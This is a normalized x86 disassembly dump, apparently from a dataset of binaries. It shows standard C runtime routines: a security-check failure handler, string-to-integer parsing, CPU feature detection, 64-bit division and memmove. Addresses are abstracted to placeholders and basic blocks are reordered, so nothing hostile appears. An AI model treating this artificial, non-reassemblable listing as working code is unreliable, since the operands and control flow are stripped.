mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x324 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov [ eax + rw-data ] 0x2
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push 0x4
pop eax
shl eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push r--data
call sub_405745
leave
retn
push 0x2
pop ecx
int 0x29
sub_40588e
push ebp
mov ebp esp
push esi
call sub_40587b
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_4058c2
pop ecx
mov esi eax
call sub_4058af
mov [ eax ] esi
pop esi
pop ebp
retn
sub_4058c2
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + rw-data ]
pop ebp
retn
inc eax
cmp eax 0x2d
jb r-xdata
cmp ecx [ eax * 8 + rw-data ]
je r-xdata
lea eax [ ecx - 0x13 ]
cmp eax 0x11
ja r-xdata
lea eax [ ecx - 0xbc ]
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_405903
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_405936
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffffffff
push edi
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_406ba0
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x218 ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov eax [ eax - 0x4 ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x320 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x31c ] eax
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
mov edi eax
lea eax [ ebp - 0x328 ]
push eax
call sub_406f93
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_4087f9
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_404072
leave
retn
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call sub_4087f9
pop ecx
sub_405a66
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405aa1
int3
pop ebp
jmp eax
sub_405aa1
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_405936
push esi
call sub_406f7e
add esp 0x10
pop esi
retn
push 0x5
pop ecx
int 0x29
sub_405acc
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
call sub_408801
pop ecx
mov ecx [ esi + 0xc ]
mov edi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_4058af
mov [ eax ] 0x9
push ebx
xor ebx ebx
test cl 0x1
je r-xdata
call sub_4058af
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test cl 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
je r-xdata
call sub_40865c
add eax 0x20
cmp esi eax
je r-xdata
or ecx 0x20
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
and ecx 0xfffffffe
mov [ esi ] eax
mov [ esi + 0xc ] ecx
xor eax eax
inc eax
push eax
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0x8 ]
push eax
push edi
call sub_408879
add esp 0xc
mov ebx eax
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
lea eax [ edx + 0x1 ]
mov [ esi ] eax
mov eax [ esi + 0x18 ]
sub ecx edx
dec eax
mov [ ebp + 0xc ] ecx
mov [ esi + 0x4 ] eax
test ecx ecx
jle r-xdata
push edi
call sub_408825
pop ecx
test eax eax
jne r-xdata
call sub_40865c
add eax 0x40
cmp esi eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ ebp + 0x8 ]
or [ esi + 0xc ] 0x20
cmp edi 0xffffffff
je r-xdata
push ecx
push edx
push edi
call sub_408879
add esp 0xc
mov ebx eax
jmp r-xdata
push esi
call sub_4092f2
pop ecx
pop ebx
mov ecx rw-data
cmp edi 0xfffffffe
je r-xdata
mov ecx [ esi + 0x8 ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
jmp r-xdata
push 0x2
push ebx
push ebx
push edi
call sub_409185
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov ecx edi
mov eax edi
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
test [ ecx + 0x4 ] 0x20
je r-xdata
sub_405c19
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
[ edi ]
cmp [ ebp + 0x14 ] eax
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
test edi edi
je r-xdata
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
test esi esi
jne r-xdata
pop edi
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
or eax 0xffffffff
jmp r-xdata
pop ebx
test ebx ebx
js r-xdata
push ebx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov ebx eax
test esi esi
je r-xdata
pop esi
xor eax eax
cmp [ ebp - 0x1c ] eax
mov [ esi + edi * 2 - 0x2 ] ax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_405acc
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_405acc
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_405d12
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
or eax 0xffffffff
pop ebp
retn
call sub_4058af
mov [ eax ] 0x16
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_409338
call sub_405c19
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
call sub_4058af
mov [ eax ] 0x22
jmp r-xdata
call sub_405a91
or eax 0xffffffff
sub_405d89
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] 0x0
test ecx ecx
jne r-xdata
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_4046e8
mov edx eax
mov [ esi + 0x8 ] edx
mov ecx [ edx + 0x6c ]
mov [ esi ] ecx
mov ecx [ edx + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
test [ edx + 0x70 ] eax
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx + 0x70 ]
test al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x70 ] eax
jne r-xdata
call sub_407486
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or eax 0x2
mov [ ecx + 0x70 ] eax
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_407808
mov [ esi + 0x4 ] eax
sub_405e11
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test eax eax
je r-xdata
test ecx ecx
jne r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
xor eax eax
leave
retn
push ebx
push esi
push edi
movzx edi [ ecx ]
xor ebx ebx
lea esi [ ecx + 0x2 ]
jmp r-xdata
cmp eax 0x2
jl r-xdata
push 0x8
push edi
call sub_40a353
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp eax 0x24
jg r-xdata
movzx edi [ esi ]
add esi 0x2
mov eax [ ebp + 0x14 ]
cmp di 0x2d
jne r-xdata
cmp di 0x2b
jne r-xdata
or eax 0x2
jmp r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
movzx edi [ esi ]
add esi 0x2
cmp eax 0x10
jne r-xdata
push edi
call sub_40a3a5
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
push edi
call sub_40a3a5
pop ecx
test eax eax
jne r-xdata
movzx eax [ esi ]
push 0x78
pop ecx
cmp ax cx
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp - 0x4 ]
cmp edx ecx
jae r-xdata
push 0x41
pop eax
cmp ax di
ja r-xdata
movzx eax [ esi ]
push 0x78
pop ecx
cmp ax cx
je r-xdata
push 0x10
pop eax
mov [ ebp + 0x10 ] eax
push 0x58
pop ecx
cmp ax cx
je r-xdata
mov edi [ ebp + 0xc ]
mov edi [ ebp - 0x8 ]
or eax 0x8
mov [ ebp - 0x4 ] eax
cmp ebx edi
jb r-xdata
push 0x19
lea eax [ edi - 0x61 ]
pop ecx
cmp ax cx
jbe r-xdata
cmp di 0x5a
jbe r-xdata
movzx edi [ esi + 0x2 ]
add esi 0x4
push 0x58
pop ecx
cmp ax cx
jne r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
test al 0x4
jne r-xdata
test edi edi
je r-xdata
imul ebx ecx
add ebx edx
jne r-xdata
lea eax [ edi - 0x61 ]
movzx edx di
cmp ax cx
ja r-xdata
mov eax [ ebp - 0x4 ]
push 0x19
pop ecx
call sub_4058af
mov [ eax ] 0x22
mov eax [ ebp - 0x4 ]
test al 0x1
je r-xdata
test al 0x1
jne r-xdata
xor ebx ebx
jmp r-xdata
mov esi [ ebp + 0x8 ]
push edi
call sub_40a3a5
mov edx eax
pop ecx
cmp edx 0xffffffff
jne r-xdata
mov edi [ ebp + 0xc ]
or eax 0x4
mov [ ebp - 0x4 ] eax
test edi edi
je r-xdata
cmp edx [ ebp - 0xc ]
jbe r-xdata
add edx 0xffffffc9
sub edx 0x20
push 0x0
test al 0x2
pop ebx
setne bl
add ebx 0x7fffffff
or ebx 0xffffffff
jmp r-xdata
test edi edi
je r-xdata
mov ecx eax
and ecx 0x2
je r-xdata
sub esi 0x2
test al 0x8
jne r-xdata
jmp r-xdata
test al 0x2
je r-xdata
mov [ edi ] esi
test ecx ecx
jne r-xdata
cmp ebx 0x80000000
ja r-xdata
movzx edi [ esi ]
add esi 0x2
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
neg ebx
cmp ebx 0x7fffffff
jbe r-xdata
sub_406005
push ebp
mov ebp esp
sub esp 0x34
lea ecx [ ebp - 0x34 ]
push [ ebp + 0x8 ]
call sub_405d89
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
test eax eax
je r-xdata
push ebx
push esi
xor edx edx
push edi
test ecx ecx
je r-xdata
mov [ eax ] ecx
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
jmp r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor ecx ecx
mov eax ecx
mov edi ecx
movzx ebx [ ecx ]
mov edi edx
push 0x8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x14 ] edi
mov [ ebp - 0xc ] ebx
lea esi [ ecx + 0x2 ]
call sub_40a353
pop ecx
pop ecx
test eax eax
je r-xdata
cmp eax 0x2
jl r-xdata
mov edx edi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x2c ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x18 ]
cmp bx 0x2d
jne r-xdata
movzx edi [ esi ]
push 0x8
push edi
mov [ ebp - 0xc ] edi
add esi 0x2
call sub_40a353
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp eax 0x24
jle r-xdata
cmp bx 0x2b
jne r-xdata
or eax 0x2
jmp r-xdata
mov edi [ ebp - 0x14 ]
mov ebx [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
movzx ebx [ esi ]
add esi 0x2
mov [ ebp - 0xc ] ebx
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
cmp eax 0x24
jg r-xdata
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
push ebx
call sub_40a3a5
pop ecx
test eax eax
je r-xdata
cdq
mov ecx edx
push ecx
push eax
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] ecx
call sub_406440
mov [ ebp - 0x18 ] ebx
mov ebx [ ebp - 0xc ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] edx
push ebx
call sub_40a3a5
pop ecx
test eax eax
jne r-xdata
movzx eax [ esi ]
push 0x78
pop ecx
cmp ax cx
je r-xdata
push 0xa
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
cmp ecx [ ebp + 0x14 ]
jae r-xdata
push 0x41
pop eax
cmp ax bx
ja r-xdata
mov eax [ ebp + 0x14 ]
movzx eax [ esi ]
push 0x78
pop ecx
cmp ax cx
je r-xdata
push 0x10
pop eax
mov [ ebp + 0x14 ] eax
push 0x58
pop ecx
cmp ax cx
je r-xdata
mov ecx [ ebp + 0x10 ]
or ebx 0x8
mov [ ebp - 0x8 ] ebx
cmp edi [ ebp - 0x14 ]
jb r-xdata
push 0x19
lea eax [ ebx - 0x61 ]
pop ecx
cmp ax cx
jbe r-xdata
cmp bx 0x5a
jbe r-xdata
movzx ebx [ esi + 0x2 ]
mov [ ebp - 0xc ] ebx
add esi 0x4
push 0x58
pop ecx
cmp ax cx
jne r-xdata
push 0x8
jmp r-xdata
test bl 0x4
jne r-xdata
test ecx ecx
je r-xdata
push edi
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
call sub_40a550
add eax [ ebp - 0xc ]
push 0x0
mov [ ebp - 0x4 ] eax
mov edi edx
pop eax
adc edi eax
mov edx [ ebp - 0x10 ]
ja r-xdata
lea eax [ ebx - 0x61 ]
cmp ax cx
movzx eax bx
ja r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x8 ]
push 0x19
pop ecx
pop eax
mov [ ebp + 0x14 ] eax
jmp r-xdata
call sub_4058af
mov [ eax ] 0x22
test bl 0x1
je r-xdata
test bl 0x1
jne r-xdata
xor edx edx
mov eax edx
mov edi edx
jmp r-xdata
mov esi [ ebp + 0xc ]
push ebx
call sub_40a3a5
pop ecx
mov ecx eax
mov [ ebp - 0xc ] eax
cmp ecx 0xffffffff
jne r-xdata
cmp eax edx
jne r-xdata
cmp eax edx
jb r-xdata
lea ecx [ eax - 0x37 ]
mov [ ebp - 0xc ] ecx
sub eax 0x20
test bl 0x2
je r-xdata
or eax 0xffffffff
or edi 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx ebx
and ecx 0x2
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x10 ]
or ebx 0x4
mov [ ebp - 0x8 ] ebx
test ecx ecx
je r-xdata
cmp edi [ ebp - 0x14 ]
jne r-xdata
or eax 0xffffffff
mov edi 0x7fffffff
jmp r-xdata
xor edx edx
mov eax edx
mov edi 0x80000000
jmp r-xdata
xor edx edx
test bl 0x2
je r-xdata
mov [ ecx ] esi
xor edx edx
cmp edi 0x80000000
ja r-xdata
sub esi 0x2
test bl 0x8
jne r-xdata
jmp r-xdata
xor edx edx
cmp edx [ ebp - 0x18 ]
jb r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
neg eax
adc edi edx
neg edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
cmp edi 0x7fffffff
jb r-xdata
jb r-xdata
movzx ebx [ esi ]
add esi 0x2
jmp r-xdata
ja r-xdata
ja r-xdata
xor edx edx
cmp eax edx
ja r-xdata
cmp ecx [ ebp - 0x1c ]
jbe r-xdata
cmp eax 0xffffffff
jbe r-xdata
jmp r-xdata
test ecx ecx
jne r-xdata
sub_4062d3
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push 0x0
push rw-data
jmp r-xdata
call sub_406005
add esp 0x14
pop ebp
retn
sub_4062fd
push ebp
mov ebp esp
and [ rw-data ] 0x0
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
or [ rw-data ] ebx
push 0xa
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor eax eax
pop ebx
leave
retn
xor ecx ecx
mov eax ebx
mov [ rw-data ] ebx
cpuid
push esi
mov esi [ rw-data ]
push edi
lea edi [ ebp - 0x10 ]
or esi 0x2
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
test [ ebp - 0x8 ] 0x100000
mov [ rw-data ] esi
je r-xdata
test [ ebp - 0x8 ] 0x10000000
je r-xdata
or esi 0x4
mov [ rw-data ] 0x2
mov [ rw-data ] esi
push 0x7
xor ecx ecx
pop eax
cpuid
lea esi [ ebp - 0x10 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
test [ ebp - 0xc ] 0x200
mov esi [ rw-data ]
je r-xdata
or esi 0x8
mov [ rw-data ] 0x3
mov [ rw-data ] esi
xor eax eax
xor ecx ecx
cpuid
lea edi [ ebp - 0x10 ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
cmp [ ebp - 0xc ] 0x756e6547
jne r-xdata
or esi 0x2
mov [ rw-data ] esi
pop edi
pop esi
cmp [ ebp - 0x4 ] 0x49656e69
jne r-xdata
cmp [ ebp - 0x8 ] 0x6c65746e
jne r-xdata
xor eax eax
inc eax
xor ecx ecx
cpuid
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov eax [ ebp - 0x10 ]
and eax 0xfff3ff0
cmp eax 0x106c0
je r-xdata
or esi 0x1
mov [ rw-data ] esi
cmp eax 0x20660
je r-xdata
cmp eax 0x20670
je r-xdata
cmp eax 0x30650
je r-xdata
cmp eax 0x30660
je r-xdata
cmp eax 0x30670
jne r-xdata
sub_406440
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_4064e0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_406550
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_406a24 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_406928 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406a24 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40679c ]
jmp [ ecx * 4 + jump_table_40681c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406888 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_406a24 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_406888 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
